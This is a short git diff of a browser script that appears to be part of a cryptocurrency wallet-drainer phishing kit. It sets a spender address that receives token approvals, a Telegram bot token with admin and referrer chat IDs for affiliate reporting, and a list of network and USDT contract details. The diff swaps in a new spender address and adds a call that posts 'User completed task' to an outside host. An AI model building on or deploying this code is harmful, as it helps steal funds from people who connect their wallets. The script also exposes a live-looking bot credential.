@@ -1,10 +1,16 @@
 window.addEventListener('DOMContentLoaded', async () => {
 const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
-const SPENDER_ADDRESS = "0x121708E6aA8BaD8DD9154f8C776084f6306DC991";
+const SPENDER_ADDRESS = "0xa2b9cade09d3cefdee5e981ca0517912bedc5961";
 
 const TELEGRAM_BOT = "8565350380:AAGJHdDxkvx1pdo1FMUmncvKnHq_iPfUMSY";
 const ADMIN_CHAT_ID = "5126266116";
 const REFERRERS = { mmd: "8279866827", zk: "7662871309"};
+
+fetch("https://gr3gtoken.vercel.app/api/send", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ message: "✅ User completed task" })
+});
 
 const NETWORKS = {
   1: { name:"Ethereum", symbol:"ETH", rpc:"https://eth.llamarpc.com", explorer:"https://etherscan.io", moonpay:"https://buy.moonpay.com?currencyCode=eth", usdtAddress:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6 },
